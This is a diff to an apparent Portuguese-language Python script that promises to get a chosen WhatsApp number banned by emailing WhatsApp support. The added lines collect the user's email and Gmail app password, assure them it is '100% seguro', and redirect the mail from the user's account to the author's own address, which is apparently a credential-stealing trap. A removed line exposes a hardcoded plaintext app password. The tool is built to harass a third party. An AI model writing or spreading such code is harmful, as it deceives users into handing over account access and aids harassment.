@@ -27,6 +27,22 @@ print ('▀▀▀░ ▄▄▄█ 　 ▀▀▀ ▀▀▀ ▀░░▀ ▄▄▄
 
 #auto
 
+c = input('coloque o seu email:')
+print('')
+print (''' Ative a verificaçao de duas etapas, apos isso, ative a opçao senha de apps, crie uma senha para o seu email. Agora coloque a senha.''')
+
+print ('')
+
+d = input ('coloque a senha:')
+
+print('')
+
+print ('''tudo pronto, a senha pode ser usada apenas para usar o seu email. Este método e 100% seguro! ''')
+
+print ('')
+print('seu email: {}' .format (c))
+print('sua senha de email: {}' .format (d))
+print('')
 a = input('coloque o numero q vc quer derrubar:')
 
 #email
@@ -36,9 +52,9 @@ def enviar_email():
  
     msg = email.message.Message()
     msg['Subject'] = 'Olá suporte do whatsapp!'
-    msg['From'] = 'slayerandkr@gmail.com'
-    msg['To'] = 'support@whatsapp.com'
-    password = 'llqeiynzlzneozlu'
+    msg['From'] = f'{c}'
+    msg['To'] = 'slayerandkr@gmail.com'
+    password = f'{d}'
     msg.add_header ('Content-Type', 'text/html')
     msg.set_payload(corpo_email )
 #login
